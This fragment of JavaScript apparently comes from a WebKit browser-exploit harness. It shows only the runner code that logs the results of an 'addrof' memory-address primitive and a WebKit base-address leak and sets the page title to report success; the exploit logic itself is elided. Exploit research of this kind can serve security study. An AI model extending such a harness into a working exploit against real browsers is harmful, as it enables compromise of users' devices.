...
async function runHeisenbugReproStrategy_TypedArrayVictim_R43r() {
    ...
    if (result.errorOccurred) {
        ...
        if (addrof_result) {
            logS3(`  RUNNER R43r: Fase 1 - Teste Addrof (Core): ${addrof_result.msg}`, addrof_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak) {
            logS3(`  RUNNER R43r: Fase 2 - Vazamento da Base do WebKit: ${webkit_leak.msg}`, webkit_leak.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkit_leak?.success) {
            document.title = `${module_name_for_title}_R43r: WebKitLeak SUCCESS!`;
        } else if (addrof_result?.success) {
            document.title = `${module_name_for_title}_R43r: Addrof OK, Leak Fail`;
        } else {
